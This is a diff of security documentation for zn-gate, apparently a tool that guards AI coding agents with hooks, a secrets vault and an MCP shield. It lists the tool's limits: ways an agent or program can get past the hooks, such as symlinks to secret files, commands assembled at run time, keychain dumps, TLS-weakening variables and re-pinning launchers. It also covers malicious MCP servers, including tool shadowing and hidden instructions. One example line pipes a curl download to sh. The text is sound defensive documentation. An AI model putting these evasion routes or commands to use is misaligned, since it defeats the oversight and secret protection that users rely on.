@@ -18,6 +18,9 @@ sandbox.**
 - [Local copies, per agent](#local-copies-per-agent)
 - [Confirmation channel](#confirmation-channel)
 - [The saved API key (`zn-gate connect`)](#the-saved-api-key-zn-gate-connect)
+- [Malicious MCP servers](#malicious-mcp-servers)
+- [Protecting zn's own configuration](#protecting-zns-own-configuration)
+- [Opt-in features that send data or limit traffic](#opt-in-features-that-send-data-or-limit-traffic)
 - [Failure behaviour](#failure-behaviour)
 - [Design decisions and known limits](#design-decisions-and-known-limits)
 - [Next steps](#next-steps)
@@ -58,7 +61,7 @@ reads, command output, search results, MCP results and pasted prompts.
 | **Copies kept by the agent on your disk** | See below. |
 | **Restoring an old `secrets.age`, with or without its old `audit.jsonl`** | The log still verifies against the older checkpoint, so the check passes. Detecting it needs an anchor outside `~/.zn` (a Team upload of the log is one). |
 | **Records of the last minute if the vault process is killed** | The vault saves its checkpoint every minute and when it locks. Records written after the last save can be cut without notice if the process is killed before the next save. |
-| **A symbolic link or a Windows short name that points at a protected file** | The path checks read the text of a path; they do not look at the disk. A link such as `notes.txt` that points at `.env` or `~/.ssh/id_rsa`, or a short name such as `PROGRA~1`, is not recognised as the protected file. Keep secrets in the vault or outside the project folder. The coding-agent hooks of the npm package also resolve the real path of the agents' own configuration files. |
+| **A symbolic link or a Windows short name that points at a protected file** | The read checks for secret files read the text of a path; they do not look at the disk. A link such as `notes.txt` that points at `.env` or `~/.ssh/id_rsa`, or a short name such as `PROGRA~1`, is not recognised as the protected file. Keep secrets in the vault or outside the project folder. Only the protection of `~/.zn` and of the agents' own configuration files, described below, resolves links: the coding-agent hooks of the npm package follow them to the real path. |
 
 zn-gate is not a sandbox, and how much it sees depends on the agent (see
 [compat.md](compat.md)). Hooks are a guardrail: a determined process can find another
@@ -75,7 +78,7 @@ removes or enters one of those directories is refused, and so is a write to a
 file in it. This is best effort: a write the hooks cannot read as a word of the
 command (a path built inside a script, in inline code such as
 `python -c "open(...)"`, or with a variable set earlier in the same command) is
-not seen. Paths are checked after `~`, variables and symlinks are resolved,
+not seen. For these files and folders, paths are checked after `~`, variables and symlinks are resolved,
 and globs and brace lists are checked against the files that exist now and
 against the names they could match.
 
@@ -453,6 +456,34 @@ stop malware running as the same user (see above).
 - **What zn does:** the hooks refuse the direct ways for an agent to read the key: keychain queries for zn's own entries (by service, account or label) and `security dump-keychain`, interpreter code that names zn's entries with a keyring library or loads zn's own modules, and anything under `~/.zn`. The hooks also treat `zn-gate connect` and `zn-gate disconnect` as commands only the user may run. The vault does not give the zn-gate key to the hooks, the secrets broker or `zn run`. Like any secret in the vault or the system keychain, a program running as you can still read it, or use zn-gate's own code to send requests with it. With the key, such a program can analyze text on your quota or revoke the key; revoking it turns the cloud check off and zn-gate goes back to local rules. The key cannot read usage or manage other keys, and you can revoke it at usezn.com/api-keys. As one more cheap barrier, the hooks also refuse a command that loads zn-gate's own client or key modules, named by their `zn-gate/lib/client` path, to ask for the key. It does not look at a project's own `lib/client` or at a relative `./lib/client` inside zn-gate itself. It is only a barrier, and a command built from pieces at run time gets around it. The scrubber hides the key's format in what the agent sees. The marker in `~/.zn/config.json` holds no key and is not enough on its own: it records the last four characters of the key `connect` stored, and zn-gate uses the cloud only with a stored key that ends the same way, so a marker written by hand (without a stored key) leaves everything local. When the marker is what turned the cloud on, zn-gate uses only that stored key: a key in `ZN_API_KEY` or `--key` is used only together with `ZN_CLOUD=1`, as documented. The saved key is only ever sent to `https://api.usezn.com`, whatever `--url` or `ZN_API_URL` say. It is also held back while the environment could weaken the TLS check: `NODE_TLS_REJECT_UNAUTHORIZED=0`, `NODE_EXTRA_CA_CERTS`, `SSL_CERT_FILE`, `OPENSSL_CONF`, `NODE_DEBUG` (Node can then print the request headers, key included; any value counts), or `NODE_OPTIONS` (also with underscores in the option name, which Node accepts, such as `--tls_keylog`) with `--require`, `--import`, `-r`, `--use-openssl-ca`, `--tls-keylog` or `--inspect` (zn-gate then uses its local rules and says why). A key you give with `--key` or `ZN_API_KEY` is your own choice and is not held back. Certificates are not pinned, because the API's certificate rotates.
 - **What it does not stop:** like the vault key, the entry sits in the keychain under your user. A program the agent runs as you can still load it, through zn's own code or an OS keyring library written in a way the hook does not recognise (for example a command built from pieces at run time), as it can for any keychain entry (see above). `connect` only accepts a key limited to analyzing text (it cannot read usage or manage keys, and a full-access key is refused), so a copy can do little, and it can be revoked at usezn.com/api-keys.
 
+## Malicious MCP servers
+
+The [MCP shield](shield.md) checks what a server sends to the agent and pins its tool definitions. It does not make an untrusted server safe:
+
+- **Only servers the shield starts are wrapped.** A server that runs at a URL (a remote server) is left as it is, because the shield can only wrap a program it starts. Its tools and output are not checked by the shield.
+- **The first tool list is trusted.** Pinning is trust on first use: what a server shows the first time is approved as it is. A changed command line (a new package version, for example) is a new server, and its first list is trusted again.
+- **Tool shadowing is a warning, not a block.** When a tool has the same or a look-alike name as an approved tool of another server, or its text names one, the shield writes a warning to standard error and to the decision log. The call is not stopped, and the agent app may not show standard error to you.
+- **Pins cover tool definitions, not server code.** A server can keep the same tool list and change what its code does, or behave differently after you approved it. The output checks still run on every call, but they look for hidden instructions and secrets, not for a server that quietly does something else.
+
+Run servers you do not trust in a sandbox or a container, and review a server before you approve its tools.
+
+## Protecting zn's own configuration
+
+zn tries to stop the agent from turning zn off, but the boundary is your operating-system user:
+
+- **Hook files.** The hooks refuse agent writes to `~/.zn` and to the agents' own hook and plugin settings (see [What zn does not protect against](#what-zn-does-not-protect-against)). The hook launcher in `~/.zn/hooks` also checks a SHA-256 list of the installed package files (the code and JSON under `lib/`, `package.json` and `bin/cli.js`) as the hook loads them. The list does not cover the launcher itself, the Node.js binary, files the package reads as data or loads with `import()`, or the inline PowerShell hooks on Windows, and if the list could not be made at install time only the main hook file is checked. Any program running as your user that can write to `~/.zn` can change all of this.
+- **Settings that change during a session (Claude Code).** The `ConfigChange` hook blocks a change to the project settings file when it adds a critical `zn audit` finding, and a skill file that now holds hidden text. A change with a finding below critical (for example a hook that sends each event to a remote address), a change to your local or user settings, a skill file over 1 MiB and `.mcp.json` are not blocked. See [compat.md](compat.md#settings-skills-and-instruction-files-that-change-in-claude-code).
+- **Instruction files.** The `InstructionsLoaded` hook cannot hold a `CLAUDE.md` or rules file back. It only records a notice in the decision log when the file holds text trying to instruct the agent.
+- **The audit baseline.** `zn audit --approve` records the project's executable configuration (MCP servers, hooks, endpoints, permissions, install scripts) and asks a person to confirm it. Later runs report any change as `ZNA023`. The baseline is checked only when someone runs `zn audit`, and it lives in the zn folder, so an environment that points zn at another folder does not find it.
+
+## Opt-in features that send data or limit traffic
+
+Three features are off by default. Each one helps in a narrow case and has limits worth knowing before you turn it on:
+
+- **Cloud check of tool output (Claude Code).** After `zn-gate connect` and `hooks.cloudCheckToolOutput: true` in your own `~/.zn/config.json`, a sample of each web, MCP and shell result (at most 16 KiB: the first 12 KiB and the last 4 KiB) goes to `api.usezn.com` to look for hidden instructions aimed at the agent. It protects against instructions the local rules miss. It does not see the middle of a long result, it never blocks or changes the output (it only adds a note), and a failed call adds nothing. Secrets zn-gate detects and listed personal data are replaced before sending, but names, postal addresses, IP addresses, usernames and secrets it does not recognize are sent as written. See [What runs locally and what goes to the API](local-checks-and-api-data.md).
+- **Online package check.** In online mode, zn-gate asks the public registry whether a package name exists and when it was first published, so it can flag a made-up name or a very new package. It sends only the package name, and only for a plain install command. It does not look inside the package, a name that exists and is older than the limit passes, and an install it cannot read as a plain install is not looked up. See [Packages your agent installs](package-install-check.md).
+- **`zn run --egress-allow`.** The command can reach only the listed hosts over HTTP(S), through a local proxy. It covers tools that honour the proxy variables. Programs that ignore them, raw sockets, DNS lookups by the program and a command that unsets the variables are not covered, and an allowed host is trusted with whatever is sent to it. See [Keep secrets out of your agent](secrets.md#egress-allowlist-for-zn-run).
+
 ## Failure behaviour
 
 - **Optional cloud check unavailable** (no connection, timeout, a service error, or a
@@ -514,6 +545,14 @@ stop malware running as the same user (see above).
 
 ## Design decisions and known limits
 
+- **Re-pinning the hook launchers is the user's.** A hook launcher runs the hook only while the installed zn-gate
+  files match the digest it recorded. The commands that record the files again are refused to an agent, like
+  `zn hooks install`: running the package's launcher refresh (`lib/agents/refresh.js`, its install step) with
+  Node.js, Bun or Deno (the path is read with `./` and `../` resolved and case ignored, and a `cd` earlier in the same
+  command counts), and installing, updating, rebuilding or linking zn-gate with npm, pnpm, yarn, bun or volta
+  (`npm update -g zn-gate` and the like). Run them in your own terminal. Not recognised: a script the agent writes and
+  then runs, a `cd` made in an earlier command, and a link or copy of the file under another name. This narrows the
+  path rather than closing it.
 - **`secrets_http_request` and secret modes:** only a secret in `proxy` mode is
   sent over HTTP, to a host in its `allowHosts` and in the places its settings
   allow. The vault checks the mode, the host and the placement again when it
@@ -573,11 +612,14 @@ stop malware running as the same user (see above).
 - **Rollback of the vault file:** restoring an older, genuine copy of
   `secrets.age` is accepted, and brings back the approvals and policy it had.
   Keep backups of `~/.zn` private.
-- **Command rules read the quoting of one line, not its variables.** The
-  download-and-run and startup-file rules decode shell quoting before they look
-  at a command (quotes, a backslash inside a word, `$'\x63url'`), but they do not
-  follow a variable: `C=curl; $C https://example.com/i.sh | sh` is not seen. The
-  rules are a guardrail against mistakes, not a sandbox.
+- **Command rules read one line.** The download-and-run and startup-file rules
+  decode shell quoting before they look at a command (quotes, a backslash inside
+  a word, `$'\x63url'`) and fill in a variable given a literal value earlier on
+  the same line (`C=curl; $C https://example.com/i.sh | sh` is blocked). They do
+  not follow a value set by an earlier tool call, by `read` or by a command
+  substitution. Both rules are off by default in the agent hooks (see
+  [Destructive commands](destructive-commands.md)). The rules are a guardrail
+  against mistakes, not a sandbox.
 - **A protected name that no text spells is not read.** Each expansion in a command (`${NAME}`, `$NAME`, `$(...)`, backticks, cmd.exe
   `%NAME%` and `!NAME!` units) is read as any text, whatever the environment the hook sees holds. A path segment is refused when it holds
   such an expansion and at least two literal characters of `.env`, `.env.*` or an SSH private key name in the places they have in
